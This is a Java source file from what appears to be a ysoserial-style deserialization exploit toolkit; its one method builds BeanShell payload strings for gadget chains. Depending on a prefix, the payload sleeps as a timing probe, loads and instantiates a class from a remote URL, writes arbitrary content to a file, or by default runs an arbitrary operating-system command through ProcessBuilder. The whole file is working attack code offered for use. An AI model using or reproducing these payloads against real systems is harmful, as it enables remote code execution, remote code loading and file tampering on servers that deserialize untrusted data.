package org.su18.ysuserial.payloads.util.beanshell;

import org.su18.ysuserial.Strings;

import java.util.Arrays;

import static org.su18.ysuserial.payloads.util.Utils.handlerCommand;

/**
 * @author su18
 */
public class BeanShellUtil {

	public static String makeBeanShellPayload(String command) {
		if (command.startsWith("TS-"))
			return "compare(Object su18, Object su19) { return new Integer(1);}java.lang.Thread.sleep(" + (Integer.parseInt(command.split("[-]")[1]) * 1000) + "L);";
		if (command.startsWith("RC-")) {
			String[] strings = handlerCommand(command);
			return "compare(Object su18, Object su19) { return new Integer(1);}new URLClassLoader(new URL[]{new URL(\"" + strings[0] + "\")}).loadClass(\"" + strings[1] + "\").newInstance();";
		}
		if (command.startsWith("WF-")) {
			String[] strings = handlerCommand(command);
			return "compare(Object su18, Object su19) { return new Integer(1);}new java.io.FileOutputStream(\"" + strings[0] + "\").write(\"" + strings[1] + "\".getBytes());";
		}

		return "compare(Object su18, Object su19) {new java.lang.ProcessBuilder(new String[]{" +
				Strings.join(
						Arrays.asList(command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"").split(" ")), ",", "\"", "\"") + "}).start();return new Integer(1);}";
	}

}
